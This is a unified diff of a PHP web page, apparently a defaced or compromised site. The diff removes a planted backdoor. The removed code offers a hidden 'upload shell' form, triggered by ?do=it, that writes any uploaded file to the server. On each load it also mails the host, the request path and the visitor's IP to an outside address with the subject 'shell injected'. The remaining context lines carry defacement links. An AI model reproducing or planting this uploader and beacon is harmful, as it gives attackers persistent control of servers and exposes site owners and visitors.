@@ -159,29 +159,4 @@ echo "<code><a href='xbug.php'>DEFAGE </a><code>";
     echo "<code><a href='?im=xfarianx'>DEFAGE </a></code>";
 }
 ?>
-
-<?php
-$do  = $_GET['do'];
-if($do== 'it'){
-$doshell = $_FILES['file']['name'];
-$doit  = $_FILES['file']['tmp_name'];
-echo "<form method='POST' enctype='multipart/form-data'>
- <input type='file'name='file' />
- <input type='submit' value='upload shell' />
-</form>";
-move_uploaded_file($doit,$doshell);
-}
-$ip = getenv("REMOTE_ADDR");
-$ra44 = rand(1, 99999);
-$subj98 = "shell injected|$ip";
-$email = "xfarianx@outlook.com";
-$from = "From:**shell lover**";
-$b75 = $_SERVER['REQUEST_URI'];
-$a45 = $_SERVER['HTTP_HOST'];
-$m22 = $ip . "";
-$msg8873 = "$a45$b75 $m22";
-mail($email, $subj98, $msg8873, $from);
-
-?>
-
 </center>
